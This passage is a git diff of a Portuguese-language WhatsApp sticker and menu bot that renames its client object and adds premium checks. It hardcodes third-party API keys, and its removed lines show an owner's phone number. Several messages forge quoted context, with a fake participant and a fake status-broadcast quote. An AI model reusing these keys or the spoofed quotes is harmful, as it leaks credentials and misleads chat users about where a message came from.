                     sayo = `https://huratera.sirv.com/PicsArt_08-01-10.00.42.png?profile=Example-Text&text.0.text=${encodeUrl(body.slice(5))}&text.0.outline.color=000000&text.0.outline.blur=0&text.0.outline.opacity=55&text.0.color=${sayo}&text.0.font.family=${sayo2}&text.0.background.color=ff0000`               
 
-                    sendStickerFromUrl(from, sayo, {quoted: ftoko})
+                    sendStickerFromUrl(from, sayo, {quoted: ftoko ,contextInfo: tomis})
 
                    
 
                     break
 
 case 'attp':
+if (!isPremium) return fakegroup (mess.only.premium)
 if (args.length < 0) return reply('Cadê o texto, hum?')
 reply(mess.wait)
 var txt = encodeURI(body.slice(6))
 anu = await getBuffer(`https://api.xteam.xyz/attp?file&text=${txt}`)
-tomioka.sendMessage( from, anu, sticker, {quoted:mek, contextInfo:tomio})
+client.sendMessage( from, anu, sticker, {quoted:mek, contextInfo:tomio})
 break	
 case 'attp1':	
 if (!isPremium) return fakegroup (mess.only.premium)	
@@ -4796,7 +4534,7 @@ if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc 
 teks = body.slice(6)
 url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp1?apikey=brizaloka&text=${teks}`)
 send = await getBuffer(url)
-tomioka.sendMessage(from, send, sticker, {quoted: ftoko})
+client.sendMessage(from, send, sticker, {quoted: ftoko ,contextInfo: tomis})
 break	     
 case 'attp2':	
 if (!isPremium) return fakegroup (mess.only.premium)	
@@ -4804,7 +4542,7 @@ if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc 
 teks = body.slice(6)
 url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp2?apikey=brizaloka&text=${teks}`)
 send = await getBuffer(url)
-tomioka.sendMessage(from, send, sticker, {quoted: ftoko})
+client.sendMessage(from, send, sticker, {quoted: ftoko ,contextInfo: tomis})
 break	
 case 'attp3': 	
 if (!isPremium) return fakegroup (mess.only.premium)
@@ -4812,7 +4550,7 @@ if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc 
 teks = body.slice(6)
 url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp3?apikey=brizaloka&text=${teks}`)
 send = await getBuffer(url)
-tomioka.sendMessage(from, send, sticker, {quoted: ftoko})
+client.sendMessage(from, send, sticker, {quoted: ftoko ,contextInfo: tomis})
 break	
 case 'attp4': 
 if (!isPremium) return fakegroup (mess.only.premium)
@@ -4820,7 +4558,7 @@ if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc 
 teks = body.slice(6)
 url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp4?apikey=brizaloka&text=${teks}`)
 send = await getBuffer(url)
-tomioka.sendMessage(from, send, sticker, {quoted: ftoko})
+client.sendMessage(from, send, sticker, {quoted: ftoko ,contextInfo: tomis})
 break	
 case 'attp5':	
 if (!isPremium) return fakegroup (mess.only.premium)
@@ -4828,7 +4566,7 @@ if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc 
 teks = body.slice(6)
 url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp5?apikey=brizaloka&text=${teks}`)
 send = await getBuffer(url)
-tomioka.sendMessage(from, send, sticker, {quoted: ftoko})
+client.sendMessage(from, send, sticker, {quoted: ftoko ,contextInfo: tomis})
 break
 case 'attp6':		
 if (!isPremium) return fakegroup (mess.only.premium)
@@ -4836,7 +4574,7 @@ if (args.length < 1) return reply(`_Coloque o texto _\n\n*Exemplo ${prefix}sttc 
 teks = body.slice(6)
 url = encodeURI(`http://brizas-api.herokuapp.com/ttp/attp6?apikey=brizaloka&text=${teks}`)
 send = await getBuffer(url)
-tomioka.sendMessage(from, send, sticker, {quoted: ftoko})
+client.sendMessage(from, send, sticker, {quoted: ftoko ,contextInfo: tomis})
 break
 case 'cc':
 case 'caracoroa':
@@ -4848,13 +4586,13 @@ fej = cararo[Math.floor(Math.random() * cararo.length)]
 gg = fej
 reply(`você conseguiu: ${fej}`)
 cararoa = fs.readFileSync('./database/cara/'+fej+'.webp')
-tomioka.sendMessage(from, cararoa, sticker, {quoted: mek})
+client.sendMessage(from, cararoa, sticker, {quoted: mek})
 break
 case 'sn':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 const sn = ['sim', 'não']
 gosto = body.slice(3)
-if (args.length < 1) return tomioka.sendMessage(from, `Você deve fazer uma pergunta...\nExemplo: ${prefix}sn O Tomioka  é um baiano preguiçoso?`, text, {quoted: mek})
+if (args.length < 1) return client.sendMessage(from, `Você deve fazer uma pergunta...\nExemplo: ${prefix}sn O Tomioka  é um baiano preguiçoso?`, text, {quoted: mek})
 const jawab = sn[Math.floor(Math.random() * (sn.length))]
 hasil = `${gosto}\n\nSegundo meus cálculos, eu acredito que... ${jawab}`
 reply(hasil)
@@ -4902,42 +4640,25 @@ reply(`O texto possui ${count} caracteres.`)
 break
 				case 'membrocm':
 				if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-		tomioka.sendMessage(from, membrocm(prefix, sender), text, {quoted: mek})
+		client.sendMessage(from, membrocm(prefix, sender), text, {quoted: mek})
                 break
 				case 'utils':
 				if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-		tomioka.sendMessage(from, utils(prefix, sender), text, {quoted: mek})
+		client.sendMessage(from, utils(prefix, sender), text, {quoted: mek})
                 break
 case 'imunes':
 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-		tomioka.sendMessage(from, fs.readFileSync('./assets/imunes.jpg'), MessageType.image, {quoted: ftoko, caption: imunes(prefix, sender), thumbnail: fs.readFileSync('./assets/imunes.jpg')})
+		client.sendMessage(from, fs.readFileSync('./assets/imunes.jpg'), MessageType.image, {quoted: ftoko ,contextInfo: tomis, caption: imunes(prefix, sender), thumbnail: fs.readFileSync('./assets/imunes.jpg')})
                 break
 				case 'metodos':
 				if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-		tomioka.sendMessage(from, metodos(prefix, sender), text, {quoted: mek})
+		client.sendMessage(from, metodos(prefix, sender), text, {quoted: mek})
                 break
-			/*  case 'compras':
-			if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-		tomioka.sendMessage(from, compras(prefix, sender), text, {quoted: mek})
-                break*/
 			  case 'pack18':
 			
 		         if (!isPremium) return fakegroup (mess.only.premium)
-                 tomioka.sendMessage(from, pack18(prefix, sender), text, {quoted: mek})
+                 client.sendMessage(from, pack18(prefix, sender), text, {quoted: mek})
                 break
-/*case 'semoji': //cry-bot
-reply(mess.wait)
-if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} 😭`)
-emoji = args[0]
-try {
-emoji = encodeURI(emoji[0])
-} catch {
-emoji = encodeURI(emoji)
-}
-anu = await fetchJson(`https://api-gdr2.herokuapp.com/api/emoji2png?text=${emoji}`)
-buffer = await getBuffer(anu.result)
-tomioka.sendMessage(from, buffer, image, { quoted: ftoko })
-break*/
 case 'emoji':
 if (!isPremium) return fakegroup (mess.only.premium)
             if (!q) return fakegroup('e o emoji?')
@@ -4959,7 +4680,7 @@ emoji = encodeURI(emoji[0])
 emoji = encodeURI(emoji)
 }
 buffer = await getBuffer(`http://api.lolhuman.xyz/api/smoji/${emoji}?apikey=6b25e69d0ba3dc9447010464`)
-tomioka.sendMessage(from, buffer, sticker, { quoted: ftoko })
+client.sendMessage(from, buffer, sticker, { quoted: ftoko ,contextInfo: tomis })
 break
 case 'gimage':
 case 'googleimage':
@@ -4975,7 +4696,7 @@ if (error){ return reply('_[ ! ] Erro encontrado ou resultado não encontrado_')
 else {
 gugIm = result
 random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
-sendFileFromUrl(random, image, {quoted: ftoko, caption: `*Resultados da pesquisa de : * ${teks}`})
+sendFileFromUrl(random, image, {quoted: ftoko ,contextInfo: tomis, caption: `*Resultados da pesquisa de : * ${teks}`})
 }
 }
 break
@@ -5013,55 +4734,11 @@ case 'button':
 
         
 break
-/*case 'teste':
-    const timestampp = speed();
-	const latensii = speed() - timestampp
-	run = process.uptime() 
-    teks = `${kyun(run)}`
-    const menu = `*꧁𝕋𝕆𝕄𝕀𝕆𝕂𝔸~𝔹𝕆𝕋꧂*
-   bem vindo *${pushname}*🎉
-         👷🏻DONO👷🏻
-   ᬊ⃔⃕͜ 亇ł❍ 亇❍ᛖł❍Ҡ么↯愛
-   *wa.me/5544998220867*
-   ✧═════•❁❀❁•═════✧
-   𝗣𝗜𝗫: *${prefix}doar*
-   ✧═════•❁❀❁•═════✧
-   ⏰tempo do bot ativo: 
-   *${temp}*
-   ✧═════•❁❀❁•═════✧
-   reportar bug: 
-   ${prefix}bug (o bug)
-   ✧═════•❁❀❁•═════✧
-   enviar sugestão:
-   ${prefix}request (sua sugestão)
-   ✧═════•❁❀❁•═════✧
-   para fazer figurinhas 
-   ${prefix}f
-   ✧═════•❁❀❁•═════✧
-   para buscar musica:
-   ${prefix}play` 
-   gbutsan = [
-    {buttonId: `👤 CRIADOR`, buttonText: {displayText: '👤 CRIADOR'}, type: 1},
-    {buttonId: `${prefix}menu2`, buttonText: {displayText: '📝 MENUS'}, type: 1}
-  ]
-tomioka.sendMessage(from, {
-locationMessage: { 
-jpegThumbnail: img,
-},
-contentText: `${menu}`,
-footerText: `Speed    : ${latensii.toFixed(4)} Second\nRuntime : ${teks}\n\n_*© 𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 Tɪᴏ Tᴏᴍɪᴏᴋᴀ*_`,
-buttons: gbutsan,
-headerType: 6
-}, MessageType.buttonsMessage)
-               
-  
-					  addFilter(from)
-          break*/
           case 'menu2':
 addFilter(from)
 const tomioks = `_ESCOLHA UM DOS MENUS ABAIXO_
 ` 
-let temporalY= tomioka.prepareMessageFromContent(from, {
+let temporalY= client.prepareMessageFromContent(from, {
   "listMessage": {
             "title": (tomioks),
             "description": `*✅prefix: ${prefix}*`,
@@ -5115,7 +4792,7 @@ let temporalY= tomioka.prepareMessageFromContent(from, {
             ]                    
           }
 }, {quoted:mek, contextInfo:tomio})
-tomioka.relayWAMessage(temporalY)
+client.relayWAMessage(temporalY)
 break
 //_ MENU PRINCIPAL
 case 'menu':
@@ -5125,9 +4802,9 @@ const latencia = speed() - tempo
 	run = process.uptime() 
     teks = `${kyun(run)}`
 gambar = fs.readFileSync('./eu.jpg'),
-mhan = await tomioka.prepareMessage(from, gambar, image, {thumbnail: gambar})
+mhan = await client.prepareMessage(from, gambar, image, {thumbnail: gambar})
 gbuutsan = [
-  {buttonId: `dono`, buttonText: {displayText: '👤 CRIADOR'}, type: 1},
+  {buttonId: `${prefix}dono`, buttonText: {displayText: '👤 CRIADOR'}, type: 1},
   {buttonId: `${prefix}menu2`, buttonText: {displayText: '📝 MENUS'}, type: 1}
 ]
  gbuttonan = {
@@ -5137,163 +4814,24 @@ imageMessage: mhan.message.imageMessage,
     buttons: gbuutsan,
     headerType: 4
 }
-await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
+await client.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
         thumbnail: fs.readFileSync('./eu.jpg'),
         caption: help(pushname, temp, prefix),
         "contextInfo": {
             mentionedJid: [sender]},
-            quoted: ftoko})
+            quoted: ftoko ,contextInfo: tomis})
            	break
-/*case 'menu':
-case 'comandos':
-addFilter(from)
-if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-wew = fs.readFileSync('./assets/vidmenu.mp4')
-const tomiokm= `❦ ══════ •⊰❂⊱• ══════ ❦
-           *꧁𝕋𝕆𝕄𝕀𝕆𝕂𝔸~𝔹𝕆𝕋꧂*
-❦ ══════ •⊰❂⊱• ══════ ❦
-┃         
-🧸bem vindo *${pushname}* ao menu do tomioka~bot🧸
-┃  
-┃          👷🏻DONO👷🏻
-┃
-➯👑 𝗗𝗢𝗡𝗢:ᬊ⃔⃕͜ 亇ł❍ 亇❍ᛖł❍Ҡ么↯愛
- ✧══════•❁❀❁•══════✧
-➯👑 𝗭𝗔𝗣: wa.me/5544998220867
- ✧══════•❁❀❁•══════✧
-➯👑 𝗣𝗜𝗫: (𝘁𝗲𝗹𝗲𝗳𝗼𝗻𝗲) 𝟰𝟰𝟵𝟵𝟴𝟮𝟮𝟬𝟴𝟲𝟳
-❗se quizer doar por chave pix ${prefix}doar
- ✧══════•❁❀❁•══════✧
-➯🔰  𝗦𝗧𝗔𝗧𝗨𝗦: 𝗢𝗡 𝙉𝙀 𝙑𝙄𝘿𝘼😏
- ✧══════•❁❀❁•══════✧
-┃ ❥ canal do yt  ❧${prefix}canal
-✧══════•❁❀❁•══════✧
-⏰tempo do bot ativo: *${temp}*
-✧══════•❁❀❁•══════✧
-┋
-┋❧${prefix}sugerir★ (comando que quer que ponhe)
-┋Utilidade－sugere para o dono um novo comando 
-  ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-┋
-┋❧${prefix}bug★ (diga o bug que encontrou)
-┋✔Utilidade－reporta algum bug 
-  ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-┋
-┋❧${prefix}infodono★ 
-┋✔Utilidade－fala as redes sociais do dono😳
-  ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-┋
-┋❧${prefix}dono★ 
-┋✔Utilidade－manda o contato do dono 
- ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-┋
-┋❧${prefix}picpay★ 
-┋✔Utilidade－pra quem quer um banco digital sendo de menor
- ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-┋
-┋❧${prefix}novid★🎉
-┋✔Utilidade－acessa o menu de novidades!
- ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-
-  *╔═══❖•ೋ° °ೋ•❖═══╗*            
-                 🃏𝗙𝗜𝗚𝗨𝗥𝗜𝗡𝗛𝗔𝗦🃏
-  *╚═══❖•ೋ° °ೋ•❖═══╝*
-
-┋❧${prefix}f
-┋✔Utilidade－faz figurinha só marcar a foto
-  ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-┋
-┋❧${prefix}toimg★ 
-┋✔Utilidade－tranforma figurinha em foto dnv
-  ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-┋
-┋❧${prefix}togif★ 
-┋✔Utilidade－transforma figurinha animada pra gif devolta!
-  ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-
-  *╔═══❖•ೋ° °ೋ•❖═══╗*            
-       🔥𝗔𝗣𝗘𝗡𝗔𝗦 𝗘𝗠 𝗚𝗥𝗨𝗣𝗢𝗦🔥
-  *╚═══❖•ೋ° °ೋ•❖═══╝*
-
-┋❧${prefix}grupo★
-┋✔Utilidade－mostra o menu para grupo
-┋
-┋❧${prefix}interativos★
-┋✔Utilidade－abre o menu de interativos 
-  ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-
-*╔═══❖•ೋ° °ೋ•❖═══╗*          
-                  🗺️𝗜𝗠𝗔𝗚𝗘𝗡𝗦🗺️
-*╚═══❖•ೋ° °ೋ•❖═══╝*
-
-┋ ❧${prefix}imagens
-┋✔Utilidade－acessa o menu de imagens e edits
-  ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-
-   *╔═══❖•ೋ° °ೋ•❖═══╗*          
-                 💎𝗦𝗼́ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠💎
-   *╚═══❖•ೋ° °ೋ•❖═══╝*
-
-┋ ❧💎${prefix}premium💎
-┋✔Utilidade－acessa o menu premium
-  ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-┋
-┋ ❧💎${prefix}logopremium💎
-┋✔Utilidade－acessa o menu de logos 
-  ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-┋❗para ser premium:
-┋➭${prefix}compras⚡
-┋
-
-   *╔═══❖•ೋ° °ೋ•❖═══╗*          
-         🤖𝗘𝗦𝗣𝗘𝗖𝗜𝗙𝗜𝗖𝗢 𝗗𝗢 𝗕𝗢𝗧🤖
-   *╚═══❖•ೋ° °ೋ•❖═══╝*
-
-┋❧${prefix}especifico★
-┋✔Utilidade－acessa o menu do bot (especifico)
-  ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-
-   *╔═══❖•ೋ° °ೋ•❖═══╗*          
-                 🎱𝗠𝗔𝗜𝗦 𝗔𝗟𝗚𝗨𝗡𝗦🎱
-   *╚═══❖•ೋ° °ೋ•❖═══╝*
-
-┋❧${prefix}outros★
-┋✔Utilidade－abre o menu de outros do bot 
-  ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-
-   *╔═══❖•ೋ° °ೋ•❖═══╗*          
-                  🗣️𝗠𝗘𝗡𝗨 𝗗𝗘 𝗩𝗢𝗭🗣️
-   *╚═══❖•ೋ° °ೋ•❖═══╝*
-
-┋❧${prefix}mvoz★
-┋✔Utilidade－abre o menu de voz do bot 
-   ◆ ▬▬▬▬▬ ❴✪❵ ▬▬▬▬▬ ◆
-  
-  *╔═══❖•ೋ° °ೋ•❖═══╗*                      
-               🦋𝗿𝗮𝗻𝗸𝘀/𝗶𝗻𝘁𝗲𝗿𝗮𝗰̧𝗮̃𝗼🦋
-  *╚═══❖•ೋ° °ೋ•❖═══╝*
-┋❧${prefix}rankes★ou
-┋❧${prefix}ranks★
-┋✔Utilidade－abre o menu de ranks para interaçao
-┋❗ somente em grupos ❗
-
-❦ ══════ •⊰❂⊱• ══════ ❦
-           *꧁𝕋𝕆𝕄𝕀𝕆𝕂𝔸~𝔹𝕆𝕋꧂*
-❦ ══════ •⊰❂⊱• ══════ ❦
-`
-tomioka.sendMessage(from, wew, MessageType.video, {mimetype: 'video/gif', contextInfo: null, quoted: ftoko, caption: (tomiokm) })
-break*/
 case 'bolsonaro':
  var apikey = `akame`
 	var imgbb = require('imgbb-uploader')
 	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 	  img = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
 	  reply(`*⏳Em processo⏳*`)
-	  midia = await tomioka.downloadAndSaveMediaMessage(img)
+	  midia = await client.downloadAndSaveMediaMessage(img)
 	  msg = body.slice(7)
 	  akame = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", midia)
 	  resultado = await getBuffer(`https://akamer.herokuapp.com/api/canvas/bolsonaro?img=${akame.display_url}&apikey=${apikey}`)
-	 tomioka.sendMessage(from, resultado, image, {quoted:mek})
+	 client.sendMessage(from, resultado, image, {quoted:mek})
 	} else {
 	  reply('Marque alguma imagem')
 	}
@@ -5302,7 +4840,7 @@ case 'gp':
 if (!isBotGroupAdmins) return reply(`O BOT PRECISA SER ADM`)
 if (!isGroup) return reply(`SÓ EM GRUPO`)
 if (!isGroupAdmins) return reply(`PRECISA SER ADMININASTROR`)
- temporall = tomioka.prepareMessageFromContent(from,{
+ temporall = client.prepareMessageFromContent(from,{
 "listMessage": {
 "title": "MENU DO GRUPO ",
 "description": "Clique nos botões baixo e envie",
@@ -5344,80 +4882,30 @@ if (!isGroupAdmins) return reply(`PRECISA SER ADMININASTROR`)
 ]                    
 }
 }, {quoted:mek})
-tomioka.relayWAMessage(temporall)
+client.relayWAMessage(temporall)
 break
 case 'resetar':
 if (!isBotGroupAdmins) return reply(`O BOT PRECISA SER ADM`)
 if (!isGroup) return reply(`SÓ EM GRUPO`)
 if (!isGroupAdmins) return reply(`PRECISA SER ADMININASTROR`)
-tomioka.query({ json: ['action', 'inviteReset', from], expect200: true })
-linkgc = await tomioka.groupInviteCode(from)
+client.query({ json: ['action', 'inviteReset', from], expect200: true })
+linkgc = await client.groupInviteCode(from)
 reply('link resetado com sucesso!')
 break
-/*case 'jadibot':
-let { WAConnection, MessageType, Mimetype} = require('@adiwajshing/baileys')
-let qrcode = require('qrcode')
-const fs = require('fs')
-
-listjadibot = [];
-
-const jadibot = async(reply,tomioka,id) => {
-	conn = new WAConnection()
-    conn.logger.level = 'warn'
-    conn.version = [2, 2123, 8]
-    conn.browserDescription = [ 'jadibot', '', '3.0' ]
-    conn.on('qr', async qr => {
-    	let bot = await qrcode.toDataURL(qr, { scale: 8 })
-    	let buffer = new Buffer.from(bot.replace('data:image/png;base64,', ''), 'base64')
-       	bot = await tomioka.sendMessage(id,buffer,MessageType.image,{caption:'Escanea el codigo QR para convertirte en un bot\n*Reglas:*\nEl codigo vence cada 30 segundos asi que intenta ser rapido.'})
-    	setTimeout(() => {
-       	tomioka.deleteMessage(id, bot.key)
-       },30000)
-    })
-    conn.on('connecting', () => {
-    })
-    conn.on('open', () => {
-    	const topesd = `Nuevo bot detectado\n\n*Dispositivo*:\n\n ${JSON.stringify(conn.user,null,2)}`
-    	reply(topesd)
-    })
-    await conn.connect({timeoutMs: 30 * 1000})
-    listjadibot.push(conn.user)
-    conn.on('chat-update', async (message) => {
-        require('../tomioka.js')(conn, message)
-    })
-}
-
-const stopjadibot = (reply) => {
-	conn = new WAConnection();
-	conn.close()
-	reply('Jadibot apagado')
-}
-
-module.exports = {
-	jadibot,
-	stopjadibot,
-	listjadibot
-}
-break*/
 case 'cry':
 addFilter(from)
            data = await fetchJson('https://waifu.pics/api/sfw/cry')
            hasil = await getBuffer(data.url)
-               tomioka.sendMessage(from, hasil, MessageType.video, {quoted: mek, mimetype: 'video/gif', thumbnail: null})
+               client.sendMessage(from, hasil, MessageType.video, {quoted: mek, mimetype: 'video/gif', thumbnail: null})
            break
-				/*case 'menu':
-				 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-                wew = fs.readFileSync('./assets/foto.png')
-                tomioka.sendMessage(from, wew, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "꧁𝕋𝕆𝕄𝕀𝕆𝕂𝔸~𝔹𝕆𝕋꧂", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./assets/botlogo.webp')} } }, caption: help(prefix) })
-                break*/
 case 'infodono':
 addFilter(from)
                 if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-					   tomioka.sendMessage(from, infodono(prefix) , text, {contextInfo: ftoko})
+					   client.sendMessage(from, infodono(prefix) , text, {contextInfo: ftoko})
 					   break
 case 'testi':
 const tp = `GGGGGFFFFGFFFDFGFGFGou`
-					   tomioka.sendMessage(from, tp, text, {quoted: fgif})
+					   client.sendMessage(from, tp, text, {quoted: fgif})
 					   break
 case 'picpay':
 addFilter(from)
@@ -5426,7 +4914,7 @@ addFilter(from)
 case 'ajudantes':
 addFilter(from)
 				      if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-					  tomioka.sendMessage(from, ajudantes(prefix) , text, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "AJUDANTES 🥰", 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+					  client.sendMessage(from, ajudantes(prefix) , text, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "AJUDANTES 🥰", 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
 					break
                 case 'leveis':
                 addFilter(from)
@@ -5480,104 +4968,104 @@ addFilter(from)
 case 'outros':
 addFilter(from)
 					if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-				    tomioka.sendMessage(from, fs.readFileSync('./assets/outros.jpg'), MessageType.image, {quoted: ftoko, caption: outros(prefix), thumbnail: fs.readFileSync('./assets/outros.jpg')})
+				    client.sendMessage(from, fs.readFileSync('./assets/outros.jpg'), MessageType.image, {quoted: ftoko ,contextInfo: tomis, caption: outros(prefix), thumbnail: fs.readFileSync('./assets/outros.jpg')})
 					break
 				case 'mvoz':
 				addFilter(from)
 				      if (!isUser) return fakegroup(`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-                tomioka.sendMessage(from, fs.readFileSync('./assets/voz.jpg'), MessageType.image, {quoted: ftoko, caption: menuvoz(prefix), thumbnail: fs.readFileSync('./assets/voz.jpg')})
+                client.sendMessage(from, fs.readFileSync('./assets/voz.jpg'), MessageType.image, {quoted: ftoko ,contextInfo: tomis, caption: menuvoz(prefix), thumbnail: fs.readFileSync('./assets/voz.jpg')})
                 break
                     case 'logopremium':
                     addFilter(from)
 				      if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-					  tomioka.sendMessage(from, fs.readFileSync('./assets/logo.jpg'), MessageType.image, {quoted: ftoko, caption: logos(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
+					  client.sendMessage(from, fs.readFileSync('./assets/logo.jpg'), MessageType.image, {quoted: ftoko ,contextInfo: tomis, caption: logos(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
 					   break
 case 'novid':
 addFilter(from)
 if (!isUser) return fakegroup(`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-tomioka.sendMessage(from, fs.readFileSync('./assets/novid.jpg'), MessageType.image, {quoted: ftoko, caption: novid(prefix), thumbnail: fs.readFileSync('./assets/novid.jpg')})
+client.sendMessage(from, fs.readFileSync('./assets/novid.jpg'), MessageType.image, {quoted: ftoko ,contextInfo: tomis, caption: novid(prefix), thumbnail: fs.readFileSync('./assets/novid.jpg')})
 break
 					case 'ranks':
 					addFilter(from)
 					  if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-					tomioka.sendMessage(from, fs.readFileSync('./assets/ranke.jpg'), MessageType.image, {quoted: ftoko, caption: rank(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
+					client.sendMessage(from, fs.readFileSync('./assets/ranke.jpg'), MessageType.image, {quoted: ftoko ,contextInfo: tomis, caption: rank(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
 					    break
                         case 'customfig':
                         addFilter(from)
                       if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-					  tomioka.sendMessage(from, custom(prefix) , text, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}\n𝐜??𝐦𝐚𝐧𝐝𝐨: ${command}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+					  client.sendMessage(from, custom(prefix) , text, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}\n𝐜??𝐦𝐚𝐧𝐝𝐨: ${command}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
 					    break
                 case 'interativos':
                 addFilter(from)
                       if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
-					  tomioka.sendMessage(from, fs.readFileSync('./assets/interact.jpg'), MessageType.image, {quoted: ftoko, caption: interact(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
+					  client.sendMessage(from, fs.readFileSync('./assets/interact.jpg'), MessageType.image, {quoted: ftoko ,contextInfo: tomis, caption: interact(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
 					    break
 case 'imagens':
 addFilter(from)
 if (!isUser) return fakegroup(`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
